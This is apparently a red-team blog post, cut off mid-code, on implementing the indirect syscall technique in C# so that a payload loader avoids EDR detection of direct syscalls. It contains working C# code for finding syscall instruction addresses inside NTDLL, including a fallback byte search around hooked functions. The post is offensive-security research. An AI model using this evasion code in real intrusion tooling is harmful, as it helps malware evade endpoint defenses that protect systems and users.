# https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp

<!DOCTYPE html><html lang="en" class="rounded-corners theme-clean no-tint sidebar-default sidebar-list-default links-default depth-subtle __variable_2bc5a2 __variable_80f980 __variable_c5e58d font-Inter sheet-open:gutter-stable dark" style="color-scheme: dark;"><body class="site-background sheet-open:overflow-hidden"><div><!--$--><!--/$--></div><div class="pointer-events-none fixed inset-x-0 top-0 z-50 h-0.5 overflow-hidden hidden animate-fade-out-slow"><div class="h-full w-full origin-left animate-crawl bg-primary-solid theme-bold:bg-header-link"></div></div><div class="motion-safe:transition-all motion-safe:duration-300 lg:chat-open:mr-80 xl:chat-open:mr-96"><div class="flex flex-col lg:flex-row lg:justify-center px-4 pl-[max(env(safe-area-inset-left),1rem)] pr-[max(env(safe-area-inset-right),1rem)] sm:px-6 sm:pl-[max(env(safe-area-inset-left),1.5rem)] sm:pr-[max(env(safe-area-inset-right),1.5rem)] md:px-8 md:pl-[max(env(safe-area-inset-left),2rem)] md:pr-[max(env(safe-area-inset-right),2rem)] max-w-screen-2xl mx-auto site-width-wide:max-w-screen-4xl transition-[max-width] duration-300"><div id="side-sheet-overlay" class="fixed inset-0 z-40 items-start bg-tint-base/3 not-hydrated:opacity-0 starting:opacity-0 starting:backdrop-blur-none transition-[opacity,display,backdrop-filter] transition-discrete duration-250 dark:bg-tint-base/6 hidden opacity-0 backdrop-blur-none"></div><div class="contents"><div class="contents [--content-scroll-margin:calc(var(--spacing)*16)]"><main class="relative min-w-0 flex-1 max-w-screen-2xl py-8 break-anywhere @container page-width-default site-width-default page-has-toc"><div class="flex flex-col [&amp;>*+*]:mt-5 whitespace-pre-wrap"><h2 id="introduction" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp#introduction"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_438qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_438qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Introduction</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">While doing CSharp tradecraft development, I was wondering if there is any SysWhispers like implementation in CSharp and I found an excellent project from <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.secforce.com/">SECFORCE <svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9858qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9858qav5ukqiv5ubsnpfivb_)"></rect></svg></a>called <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/SECFORCE/SharpWhispers">SharpWhispers<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9g58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9g58qav5ukqiv5ubsnpfivb_)"></rect></svg></a>. This makes my life so much easier by providing functions (SharpASM) to execute assembly and re-implement the "<a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/">Sorting by System Call Address<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9o58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9o58qav5ukqiv5ubsnpfivb_)"></rect></svg></a>" way to look for syscall number (SSN) like what SysWhispers2 did.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">With the increasing use of direct syscall as an evasion technique against EDR API hooking, some detection strategies such as "Mark of the Syscall" signature and execution of syscall instruction originating from outside of NTDLL were developed to identify abnormal syscall usage in both static and dynamic perspective.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Therefore, <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://twitter.com/KlezVirus">KlezVirus<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9898qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9898qav5ukqiv5ubsnpfivb_)"></rect></svg></a> implemented another solution called <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/klezVirus/SysWhispers3">SysWhispers3<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9g98qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9g98qav5ukqiv5ubsnpfivb_)"></rect></svg></a> to demonstrate indirect syscall technique, which can be used to bypass detection strategies mentioned above.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By implementing indirect syscall, you could enjoy the following benefits:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Avoid having syscall instruction in your payload</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Ensure the syscall execution is always originated from legitimate NTDLL</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In order to provide better evasion capability to my loader, I started implementing indirect syscall in CSharp based on the SharpWhispers and SysWhispers3 implementation and this blog will document the key steps that I did to achieve it.</p><h2 id="implementing-indirect-syscall-in-csharp" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp#implementing-indirect-syscall-in-csharp"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_4h8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4h8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Implementing Indirect Syscall in CSharp</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Indirect syscall technique aims to replace the original syscall instruction with a jump instruction pointing to a memory address of NTDLL where it stores the syscall instruction.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">For instance, the offset 0x12 of each NTDLL API (i.e., NtAllocateVirtualMemory) will generally be the syscall instruction as shown below:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="eager" class="block" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FY2pcM5ilZRpdC9Nusp93%252Fimage.png%3Falt%3Dmedia%26token%3D6f267522-c841-45ed-b661-bf1a973b078a&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=d7dc388c&amp;sv=2" width="1404" height="365"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">To obtain the syscall address of each NTDLL API, we could walk through the loaded NTDLL in the current process to obtain the address of each NTDLL exported functions and calculate the offset 0x12 and 0x0f respectively to obtain address pointing to the syscall/sysenter (syscall equivalent in 32-bit OS) instruction.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The original SharpWhispers had already did the hard part to locate the export table directory and the relative virtual address of each NTDLL API function. My part will be trying to re-implement the similar function as SysWhispers3 did in CSharp to obtain the address of syscall instruction for each NTDLL APIs.</p><div class="hint transition-colors rounded-corners:rounded-md circular-corners:rounded-xl overflow-hidden bg-info border-info theme-muted-tint:bg-info-solid/2 [html.sidebar-filled.theme-bold.tint_&amp;]:bg-info-solid/2 text-sm grid grid-cols-[auto_1fr] mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" aria-label="Information" role="note"><div class="py-4 pl-4 text-info-subtle contrast-more:text-info"><svg class="gb-icon size-[1.2em] mt-px leading-normal"><title>circle-info</title><defs><mask id="_R_4t8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/circle-info.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4t8qav5ukqiv5ubsnpfivb_)"></rect></svg></div><div class="p-4 pl-3 empty:p-0 -row-end-1 -col-end-1 space-y-3 [&amp;_.hint]:border [&amp;_pre]:border [&amp;_pre]:border-neutral"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid text-neutral-strong [&amp;_.can-override-bg]:bg-neutral-active [&amp;_.can-override-text]:text-neutral-strong flip-heading-hash text-start self-start justify-start">The original SysWhisper3 implementation used a fixed offset to calculate the syscall. However, it could be possible to fail to find the syscall instruction if EDR hooking in installed and it was mentioned in <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/">his blog post<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_2cst8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_2cst8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid text-neutral-strong [&amp;_.can-override-bg]:bg-neutral-active [&amp;_.can-override-text]:text-neutral-strong flip-heading-hash text-start self-start justify-start">To ensure I always locate the syscall instruction, I included additional search in case the static offset failed to find the syscall instruction by searching byte by byte for syscall instruction that is next to the NTDLL API address.</p></div></div><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_v8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">public static IntPtr SC_Address(IntPtr NtApiAddress)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	IntPtr SyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#if WIN64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] syscall_code =<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		0x0f, 0x05, 0xc3<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	UInt32 distance_to_syscall = 0x12;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] syscall_code =<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		0x0f, 0x34, 0xc3<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	UInt32 distance_to_syscall = 0xf;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// Start with common offset to syscall<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	var tempSyscallAddress = NtApiAddress.ToInt64() + distance_to_syscall;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	SyscallAddress = (IntPtr) tempSyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] AddressData = new byte[3];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	Marshal.Copy(SyscallAddress, AddressData, 0, AddressData.Length);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	if (AddressData.SequenceEqual(syscall_code)){<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		return SyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	long searchLimit = 512;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	long regionSize = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	long pageAddress = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	long currentAddress = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// If syscall not found, search the closest one to the current NTDLL API address byte by byte<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PE.MEMORY_BASIC_INFORMATION mem_basic_info = new PE.MEMORY_BASIC_INFORMATION();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	if(Imports.VirtualQueryEx(Imports.GetCurrentProcess(), NtApiAddress, out mem_basic_info, (uint)Marshal.SizeOf(typeof(PE.MEMORY_BASIC_INFORMATION))) != 0)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		regionSize = mem_basic_info.RegionSize.ToInt64();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		pageAddress = (long)mem_basic_info.BaseAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		currentAddress = NtApiAddress.ToInt64();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		searchLimit = regionSize-(currentAddress-pageAddress)-syscall_code.Length+1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	for (int num_jumps = 1 ; num_jumps &lt; searchLimit ; num_jumps++){<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		tempSyscallAddress = NtApiAddress.ToInt64() + num_jumps;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		SyscallAddress = (IntPtr) tempSyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		AddressData = new byte[3];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		Marshal.Copy(SyscallAddress, AddressData, 0, AddressData.Length);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		if (AddressData.SequenceEqual(syscall_code)){<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			return SyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	return IntPtr.Zero;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Then, I edited in the original SYSCALL_ENTRY object to have additional attribute to store the address of the syscall instruction for each NTDLL API.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In addition, additional check (iswow64()) is added to determine if it is Windows 32-bit on Windows 64-bit (WoW64) and skip the syscall instruction search to minimize overhead to the payload.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_158qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">public struct SYSCALL_ENTRY<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		public string Hash;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		public IntPtr Address;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		public IntPtr SyscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#if !WIN64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	public static bool iswow64()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		byte[] checkiswow64 =<!-- -->
